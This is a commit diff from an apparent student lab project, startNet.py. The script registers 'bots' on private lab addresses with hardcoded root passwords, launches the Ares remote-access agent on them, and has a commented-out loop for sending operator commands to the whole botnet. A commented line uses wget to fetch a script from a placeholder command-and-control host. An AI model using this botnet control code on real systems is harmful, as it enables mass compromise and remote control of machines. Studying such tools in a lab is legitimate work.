c590a42230eecbda8f1be438fe57418edf09be21
Dennis <dqtran@cpp.edu>
2018-08-06 00:31:24 -0400

    Officially fixed while loop. For some reason ssh is non functional after running py script on remotes hosts

--- startNet.py
+++ startNet.py
@@ -45,27 +45,28 @@ def add_bot(host, user, password):
     botnet.append(new_bot)
 
 add_bot('192.168.1.13', 'root', 'cpp')
-add_bot('192.168.1.25', 'root', 'cpp')
-add_bot('192.168.1.26', 'root', 'cpp')
-add_bot('192.168.1.27', 'root', 'cpp')
-add_bot('192.168.1.28', 'root', 'cpp')
-add_bot('192.168.1.31', 'root', 'cpp')
-add_bot('192.168.1.21', 'root', 'cpp')
-add_bot('192.168.1.22', 'root', 'cpp')
-add_bot('192.168.1.23', 'root', 'cpp')
-add_bot('192.168.1.24', 'root', 'cpp')
+#add_bot('192.168.1.25', 'root', 'cpp')
+#add_bot('192.168.1.26', 'root', 'cpp')
+#add_bot('192.168.1.27', 'root', 'cpp')
+#add_bot('192.168.1.28', 'root', 'cpp')
+#add_bot('192.168.1.31', 'root', 'cpp')
+#add_bot('192.168.1.21', 'root', 'cpp')
+#add_bot('192.168.1.22', 'root', 'cpp')
+#add_bot('192.168.1.23', 'root', 'cpp')
+#add_bot('192.168.1.24', 'root', 'cpp')
 
 # list user home directory
 #command_bots('git clone https://github.com/sweetsoftware/Ares.git')
 command_bots('/home/osboxes/Ares/agent/agent.py')
-isDone=False
-while isDone==False:
-	command = raw_input("Enter a command to control the botnet: \n")
-	done=raw_input("Would you like to enter another command?(y/n)")
-	if done=='n' or 'N':
-		isDone=True
+#isDone=False
+#while isDone==False:
+#	command = raw_input("Enter a command to control the botnet: \n")
+#	command_bots(command)
+#	done=raw_input("Would you like to enter another command?(y/n)")
+#	if done=='n':
+#		isDone=True
 #	else:
-#		isDone=True	
+#		isDone=False	
 	
 # download scripts/files etc.
 #command_bots("""wget  -O /Users/Owner/Desktop/ "http://c&cserver.com/script.py"""")
